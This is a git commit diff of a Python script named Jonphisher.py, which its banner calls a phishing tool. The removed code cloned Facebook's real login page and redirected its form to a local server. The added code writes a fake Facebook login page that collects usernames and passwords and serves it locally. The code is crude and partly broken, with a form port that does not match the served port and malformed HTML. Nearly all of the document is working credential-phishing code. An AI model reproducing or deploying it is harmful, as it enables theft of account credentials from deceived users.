c5bd9c222fb763423d6014e9b05ec6ce5fe4d055
JHONSON <114837630+Jhonsonwannaa@users.noreply.github.com>
2024-05-28 13:08:34 +0100

    Update Jonphisher.py

--- Jonphish.py
+++ Jonphish.py
@@ -1,43 +1,93 @@
-import requests
 from bs4 import BeautifulSoup
 import urllib3
-import os 
-from rich.console import Console
 import os
-
-
-console = Console()
-
-
+import pyfiglet
+from colorama import Fore, Style
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-#author : Jhonson
 
-site=['https://m.facebook.com/login/?locale=fr_FR']
-decor = '[bold yellow]'
-console.print(f'\n\n{decor}'+'[0]'+str('FACEBOOK')+'\n\n')
+def arparse():
 
-try :
-	
-		url=int(console.input('[bold blue]Veuillez entrer ou saisir un chiffre correspondant a votre site phishing que vous voulez voir :'))
-		r =requests.get(f'{site[url]}', verify=False)
-		soup = BeautifulSoup(r.text, 'html.parser')
-		modif = soup.select_one('form[action]')
-		if modif:
-		  modif['action']='http://0.0.0.0:8000'
-		  change = str(soup.prettify())
-		  file =open('index.html','w')
-		  file.write(change)
-		else :
-		  form_tag = soup.find('form')
-		  form_tag['action'] = 'http://0.0.0.0:8000'  
-		  car = str(soup.prettify())
-		  file=open('index.html', 'w')
-		  file.write(car)
-		 
-		
-		  	
-		  
-except :
-	console.print ('[bold red] Entre uniquement un chiffre !')
+     
+     text = "JPHISHER"
+     font = "slant"
+     taille=10000
+     banner = str(pyfiglet.figlet_format(text, font,width=taille))
+
+     print(Fore.YELLOW + Style.BRIGHT +f'MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM\n\n              {banner}\n                  Author:Jhonson\n                  Email:wannaajhonson@gmail.com\n\n                  PHISHING-TOOL\nMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM\n' + Style.RESET_ALL)
+
+
+
+def server_reception(host, port):
+        global host_recept
+        host_recept=host+':'+str(port)
+
+
+
+def code_source():
+
+        global index
+
+
+        index =f"""<!doctype html>
+        <html>
+        <head>
+        <meta name="viewport" content="width=320,initial-scale=1">
+        <meta charset="uft-8">
+
+        <meta property="og:title" content="">
+        <meta property="og:description" content="">
+        <meta property="og:image" content="">
+
+        <link rel="stylesheet" href="">
+        <link rel="stylesheet" href="">
+
+        </head>
+        <body>
+        <div class="container-login">
+        <h2 class="title-fa">facebook HackScript</h2>
+        <form action="http://0.0.0.0:8000" method="post" >
+        <div class="input-login">
+                <label for="username">Username:</label><input name="username" type="text" id="username"></input><br /><br /><label for="password">Password:</label><input name="password" id="password" type="password"></input><br/><button name="submit" type="submit">Se connecter</button>
+        </form>
+        <center><br><a href=</a></center>
+        <div class="hr"><p class="hr-inner">ou</p></div><br>
+        <a href="#!" class="btn-input"></a>
+
+        <ul class="list-login-1">
+        <li class="link active-link"><a href="#!">HackScript</a></li>
+        <li class="link"><a href="#!"></a></li>
+        <li class="link"><a href="#!></a></li>
+        </ul>
+        <footer>
+        <p class="copyright-login"></p>
+        </footer>
+        </div>
+
+
+        </div>
+        </body>
+        </html>"""
+        file = open('index.html', 'w')
+        file.write(index)
+
+
+
+def server_exploit(url, port, lien):
+
+        site =lien
+
+        print(Fore.GREEN + Style.BRIGHT +f'\n Lien du serveur : {site}\n'+ Style.RESET_ALL)
+  
+
+        os.system(f'python -m http.server {port}')  
+
+
+if __name__=='__main__':
+       arparse()
+       code_source()
+       var=index
+
+       server_exploit('',3000, f'http://0.0.0.0:3000')
+
